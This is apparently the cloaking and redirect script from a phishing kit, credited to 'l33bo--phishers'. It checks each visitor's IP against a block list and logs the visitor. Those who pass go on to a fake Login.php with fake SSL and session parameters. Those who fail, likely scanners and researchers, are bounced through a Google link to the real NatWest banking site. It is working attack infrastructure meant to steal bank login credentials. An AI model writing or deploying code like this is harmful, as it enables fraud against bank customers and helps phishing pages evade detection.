<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require_once("assets/includes/functions.php");
$ips = array(	$_SERVER['REMOTE_ADDR'], );
$checklist = new IpBlockList( );
foreach ($ips as $ip ) {
	$result = $checklist->ipPass( $ip );
	if ( $result ) {
		$msg = "PASSED: ".$checklist->message();
        $fp = fopen("assets/logs/accepted_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);		
		session_start();
        $_SESSION['page_a_visited'] = true;
		redirectTo("Login.php?sslchannel=true&sessionid=" . generateRandomString(80));
	}
	else {
		$msg = "FAILED: ".$checklist->message();
		$fp = fopen("assets/logs/denied_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);
header("Location: https://www.google.ru/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwiVy-zEiL_JAhXBkSwKHSLMAHUQFggbMAA&url=https%3A%2F%2Fpersonal.natwest.com%2F&usg=AFQjCNEwiAcYb-gv7DrpPno4YjO4Tk7tQQ&bvm=bv.108538919,d.bGg");
	}
}
?>